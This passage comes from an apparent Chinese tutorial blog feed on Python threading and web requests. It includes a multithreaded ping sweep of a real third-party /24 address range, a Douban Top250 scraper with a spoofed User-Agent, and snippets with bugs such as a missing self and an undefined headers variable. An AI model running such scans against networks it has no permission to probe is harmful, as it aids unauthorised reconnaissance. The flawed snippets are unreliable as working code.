class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;33818</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;30867</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;44513</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;53577</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;48950</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;69524</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;36499</span><br><span class="line">....（中间省略，太多了）</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;21070</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;14042</span><br><span class="line">http:&#x2F;&#x2F;www.heibanke.com&#x2F;lesson&#x2F;crawler_ex00&#x2F;14042</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdrd0gzfvtj31eu0iuwiw.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdrd0gzfvtj31eu0iuwiw.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412223724478"></p><h2 id="线程和进程"><a href="#线程和进程" class="headerlink" title="线程和进程"></a>线程和进程</h2><p><strong>进程</strong>：进程是程序的一次执行。每一个进程都有自己的地址空间、内存、数据栈及其他记录其运行轨迹的辅助数据。</p><p><strong>线程</strong>：所有的线程运行在同一个进程中，共享相同的运行环境。线程有开始顺序执行和结束三个部分。</p><p><em>什么？完全听不懂在说什么？看看下面的介绍吧！</em></p><p>对于操作系统来说，一个任务就是一个进程（Process），比如打开一个浏览器就是启动一个浏览器进程，打开一个记事本就启动了一个记事本进程，打开两个记事本就启动了两个记事本进程，打开一个Word就启动了一个Word进程。</p><p>有些进程还不止同时干一件事，比如Word，它可以同时进行打字、拼写检查、打印等事情。在一个进程内部，要同时干多件事，就需要同时运行多个“子任务”，我们把进程内的这些“子任务”称为线程（Thread）。</p><p>由于每个进程至少要干一件事，所以，一个进程至少有一个线程。当然，像Word这种复杂的进程可以有多个线程，多个线程可以同时执行，多线程的执行方式和多进程是一样的，也是由操作系统在多个线程之间快速切换，让每个线程都短暂地交替运行，看起来就像同时执行一样。当然，真正地同时执行多线程需要多核CPU才可能实现。 </p><h2 id="thread模块"><a href="#thread模块" class="headerlink" title="thread模块"></a>thread模块</h2><p>start_new_thread(function, args kwargs=None)</p><p>产生一个新的线程，在新的线程中用指定的参数和可选的kwargs来调用这个函数。</p><p>注意：使用该方式时，一定要家time.sleep()，否则每个线程将可能不执行。</p><p>方法缺点：在遇到较复杂的问题时，线程数不易控制。</p><p>注意：python3中，由于thread有两个很致命的问题，所以python3更推荐用threading代替thread，所以，thread被改名为_thread。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;hello world! %s\n&#x27;</span> % time.ctime())</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    _thread.start_new_thread(fun1, ())</span><br><span class="line">    _thread.start_new_thread(fun1, ())</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="小脚本–对C段所用信息进行检测"><a href="#小脚本–对C段所用信息进行检测" class="headerlink" title="小脚本–对C段所用信息进行检测"></a>小脚本–对C段所用信息进行检测</h2><ol><li>检测是否ping的通的返回内容</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_check</span>():</span></span><br><span class="line">    check = Popen([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;ping -c 2 &#x27;</span>+<span class="string">&#x27;127.0.0.1&#x27;</span>],stdin=PIPE,stdout=PIPE)</span><br><span class="line">    data = check.stdout.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ttl&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(data):</span><br><span class="line">        print(<span class="string">&#x27;UP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ping_check()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ping 成功返回内容</span><br><span class="line">b&#39;PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.043 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.098 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 packets received, 0.0% packet loss</span><br><span class="line">round-trip min&#x2F;avg&#x2F;max&#x2F;stddev &#x3D; 0.043&#x2F;0.071&#x2F;0.098&#x2F;0.028 ms</span><br><span class="line"></span><br><span class="line"># ping 失败返回内容</span><br><span class="line">b&#39;PING 127.1.0.1 (127.1.0.1): 56 data bytes</span><br><span class="line">Request timeout for icmp_seq 0</span><br><span class="line"></span><br><span class="line">--- 127.1.0.1 ping statistics ---</span><br><span class="line">2 packets transmitted, 0 packets received, 100.0% packet loss\n&#39;</span><br></pre></td></tr></table></figure><ol start="2"><li>对C段所有信息检测</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_check</span>(<span class="params">ip</span>):</span></span><br><span class="line">    check = Popen([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;ping -c 2 &#x27;</span>+ip],stdin=PIPE,stdout=PIPE)</span><br><span class="line">    data = check.stdout.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ttl&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(data):</span><br><span class="line">        print(ip)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        ip = <span class="string">&#x27;185.199.108.&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">        _thread.start_new_thread(ping_check, (ip,))</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">185.199.108.1</span><br><span class="line">185.199.108.2</span><br><span class="line">185.199.108.3</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><h3 id="threading模块基本构造"><a href="#threading模块基本构造" class="headerlink" title="threading模块基本构造"></a>threading模块基本构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>(<span class="params">name</span>):</span></span><br><span class="line">    print(name + time.ctime(),end=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 设置线程集合</span></span><br><span class="line">    threads = []</span><br><span class="line">    keys = [<span class="string">&#x27;张三 &#x27;</span>, <span class="string">&#x27;李四 &#x27;</span>, <span class="string">&#x27;王五 &#x27;</span>]</span><br><span class="line">    threads_count = <span class="built_in">len</span>(keys)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置线程内容某个函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads_count):</span><br><span class="line">        t = threading.Thread(target=fun1, args=(keys[i],))</span><br><span class="line">        threads.append(t)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置线程开始   </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads_count):</span><br><span class="line">        threads[i].start()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置线程结束</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads_count):</span><br><span class="line">        threads[i].join()</span><br><span class="line">        </span><br><span class="line">main()</span><br></pre></td></tr></table></figure><pre><code>张三 Mon Apr 13 15:41:37 2020李四 Mon Apr 13 15:41:37 2020王五 Mon Apr 13 15:41:37 2020</code></pre><h3 id="Queue模块"><a href="#Queue模块" class="headerlink" title="Queue模块"></a>Queue模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    q.put(i)</span><br><span class="line"></span><br><span class="line">q.empty(), q.qsize()</span><br></pre></td></tr></table></figure><pre><code>(False, 10)</code></pre><p>取出Queue队列的元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> q.empty() == <span class="literal">False</span>:</span><br><span class="line">    print(q.get(), end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>0 1 2 3 4 5 6 7 8 9 </code></pre><h3 id="Queue-Threading-解决C段信息探测"><a href="#Queue-Threading-解决C段信息探测" class="headerlink" title="Queue + Threading 解决C段信息探测"></a>Queue + Threading 解决C段信息探测</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fun1</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, queue</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self._queue = queue</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            ip = self._queue.get()</span><br><span class="line">            ping_check(ip)</span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ping_check</span>(<span class="params">self, ip</span>):</span></span><br><span class="line">        check = Popen([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;ping -c 2 &#x27;</span>+ip],stdin=PIPE,stdout=PIPE)</span><br><span class="line">        data = check.stdout.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ttl&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(data):</span><br><span class="line">            print(ip)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    threads = []</span><br><span class="line">    threads_count = <span class="number">200</span></span><br><span class="line">    </span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        q.put(<span class="string">&#x27;185.199.108.&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads_count):</span><br><span class="line">        threads.append(fun1(q))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.start()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.join()</span><br><span class="line">        </span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">185.199.108.127</span><br><span class="line">185.199.108.37</span><br><span class="line">185.199.108.31</span><br><span class="line">185.199.108.33</span><br><span class="line">185.199.108.32</span><br><span class="line">185.199.108.30</span><br><span class="line">185.199.108.12</span><br><span class="line">185.199.108.36</span><br><span class="line">........</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python安全编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Web编程</title>
      <link href="2020/04/12/Python%20Web%E7%BC%96%E7%A8%8B/"/>
      <url>2020/04/12/Python%20Web%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>本文学习Python Web编程以及利用爬虫技术爬取豆瓣电影TOP250的电影名。</p><a id="more"></a><h2 id="必备模块介绍"><a href="#必备模块介绍" class="headerlink" title="必备模块介绍"></a>必备模块介绍</h2><h3 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h3><blockquote><p>urllib提供了一系列用于操作URL的功能</p></blockquote><ol><li>urllib.request.urlopen(url,data,timeout)  发起请求获取响应页面</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">url = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">r = urllib.request.urlopen(url)</span><br><span class="line">print(r.read())</span><br></pre></td></tr></table></figure><ol start="2"><li>urllib.request.urlretrieve(url,filepath+filename) 发起请求下载文件</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://www.baidu.com/img/bd_logo1.png&#x27;</span></span><br><span class="line">urllib.request.urlretrieve(url,filename=<span class="string">&#x27;./bd.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Requests"><a href="#Requests" class="headerlink" title="Requests"></a>Requests</h3><ol><li>安装 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br><span class="line">import requests</span><br></pre></td></tr></table></figure></li><li>发送网络请求<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">requests.get()</span><br><span class="line">requests.post(url)</span><br><span class="line">requests.put(url)</span><br><span class="line">requests.delete(url)</span><br><span class="line">requests.head(url)</span><br><span class="line">requests.options(url)</span><br></pre></td></tr></table></figure></li><li>为URL传递参数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&#x27;key1&#x27;</span>:<span class="string">&#x27;value1&#x27;</span>,<span class="string">&#x27;key2&#x27;</span>:<span class="string">&#x27;value2&#x27;</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">&quot;http://httpbin.org/get&quot;</span>, params=payload)</span><br><span class="line">print(r.url)</span><br><span class="line"><span class="comment">#http://httpbin.org/get?key2=value2&amp;key1=value1</span></span><br></pre></td></tr></table></figure></li><li>响应内容<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&quot;http://nizeyu.xyz&quot;</span>)</span><br><span class="line">print(r.text)</span><br><span class="line">print(r.encoding)</span><br></pre></td></tr></table></figure></li><li>二进制响应内容<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">&quot;http://nizeyu.xyz&quot;</span>)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure></li><li>定制请求头（headers中可以加入cookies，在一些爬虫场景需要登录的情况下可以使用）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header = &#123;<span class="string">&#x27;conten-type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">&quot;http://nizeyu.xyz&quot;</span>, header=headers)</span><br></pre></td></tr></table></figure></li><li>复杂的POST请求<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&#x27;key1&#x27;</span>:<span class="string">&#x27;value1&#x27;</span>,<span class="string">&#x27;key2&#x27;</span>:<span class="string">&#x27;value2&#x27;</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">&quot;http://httpbin.org/post&quot;</span>, data=payload)</span><br></pre></td></tr></table></figure></li><li>响应状态码（适用于目录扫描场景）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(url)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure></li><li>响应头<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(url)</span><br><span class="line">print(r.headers)</span><br></pre></td></tr></table></figure></li><li>Cookies<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(url)</span><br><span class="line">print(r.cookies[<span class="string">&#x27;cookie_name&#x27;</span>])</span><br></pre></td></tr></table></figure></li><li>超时（单位是秒）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(url, timeout=<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure></li><li>错误与异常</li></ol><ul><li>遇到网络错误（DNS查询失败、拒绝连接）时，Requests会抛出一个ConnectionError异常。</li><li>遇到无效的HTTP响应时，Requests会抛出一个HTTPError异常。</li><li>遇到请求超时，Requests则会抛出Timeout异常。</li></ul><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><blockquote><p>网络爬虫（又称为网页<a href="https://baike.baidu.com/item/%E8%9C%98%E8%9B%9B/8135707">蜘蛛</a>，网络机器人，在<a href="https://baike.baidu.com/item/FOAF">FOAF</a>社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取<a href="https://baike.baidu.com/item/%E4%B8%87%E7%BB%B4%E7%BD%91/215515">万维网</a>信息的程序或者脚本。另外一些不常使用的名字还有<a href="https://baike.baidu.com/item/%E8%9A%82%E8%9A%81/9770178">蚂蚁</a>、自动索引、模拟程序或者<a href="https://baike.baidu.com/item/%E8%A0%95%E8%99%AB/4454380">蠕虫</a>。</p><p>用爬虫最大的好处是批量且自动化得获取和处理信息。</p></blockquote><h2 id="爬虫练习–爬取豆瓣电影TOP250"><a href="#爬虫练习–爬取豆瓣电影TOP250" class="headerlink" title="爬虫练习–爬取豆瓣电影TOP250"></a>爬虫练习–爬取豆瓣电影TOP250</h2><ol><li>查看爬取网页的源码，由此构造正则表达式</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdqx7b2um8j31i40u0156.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gdqx7b2um8j31i40u0156.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200412133022069"></p><ol start="2"><li>定义get_one_page(url)函数去获取单个页面的响应内容</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one_page</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> res.text</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">get_one_page(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li><p>分析每个页面的url组成部分，定义需要爬虫的网页url的命名规律。</p><table><thead><tr><th>需要爬虫网页的URL</th></tr></thead><tbody><tr><td><a href="https://movie.douban.com/top250?start=0&amp;filter=">https://movie.douban.com/top250?start=0&amp;filter=</a></td></tr><tr><td><a href="https://movie.douban.com/top250?start=25&amp;filter=">https://movie.douban.com/top250?start=25&amp;filter=</a></td></tr><tr><td><a href="https://movie.douban.com/top250?start=50&amp;filter=">https://movie.douban.com/top250?start=50&amp;filter=</a></td></tr><tr><td>…</td></tr></tbody></table></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义需要爬取的网页URl集合</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urls</span>():</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;https://movie.douban.com/top250?start=&#123;&#125;&amp;filter=&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">250</span>,<span class="number">25</span>)]</span><br></pre></td></tr></table></figure><ol start="4"><li>设置正则表达式匹配模式去匹配获取到的字符串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pattern = <span class="string">&#x27;&lt;span class=&quot;title&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls():</span><br><span class="line">    key += re.findall(pattern, get_one_page(url))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&amp;&quot;</span> <span class="keyword">in</span> k:</span><br><span class="line">        key.remove(k)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><pre><code>[&#39;肖申克的救赎&#39;, &#39;霸王别姬&#39;, &#39;阿甘正传&#39;, &#39;这个杀手不太冷&#39;, &#39;美丽人生&#39;, &#39;泰坦尼克号&#39;, &#39;千与千寻&#39;, &#39;辛德勒的名单&#39;, &#39;盗梦空间&#39;, &#39;忠犬八公的故事&#39;, &#39;海上钢琴师&#39;, &#39;楚门的世界&#39;, &#39;三傻大闹宝莱坞&#39;, &#39;机器人总动员&#39;, &#39;放牛班的春天&#39;, &#39;星际穿越&#39;, &#39;大话西游之大圣娶亲&#39;, &#39;熔炉&#39;, &#39;疯狂动物城&#39;, 